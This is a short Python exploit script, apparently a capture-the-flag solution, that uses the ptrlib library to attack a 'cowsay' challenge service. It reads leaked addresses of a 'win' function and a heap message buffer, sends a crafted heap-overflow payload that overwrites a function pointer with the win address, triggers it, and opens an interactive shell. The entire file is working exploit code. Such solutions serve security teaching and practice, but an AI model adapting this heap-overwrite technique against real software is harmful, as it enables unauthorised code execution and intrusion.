from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9001))

#sock = Process("../challenge/chall")
sock = Socket(HOST, PORT)

addr_win = int(sock.recvregex("<win> = 0x([0-9a-f]+)")[0], 16)
logger.info("win @ " + hex(addr_win))

sock.sendlineafter("> ", "3")
addr_message = int(sock.recvregex("0x([0-9a-f]+)")[0], 16) + 0x10
logger.info("cowsay->message @ " + hex(addr_message))

payload  = p64(addr_win)
payload += b"A"*0x18
payload += p64(addr_message)

sock.sendlineafter("heap\n> ", "2")
sock.sendlineafter("Message: ", payload)

sock.sendlineafter("> ", "1")

sock.sh()
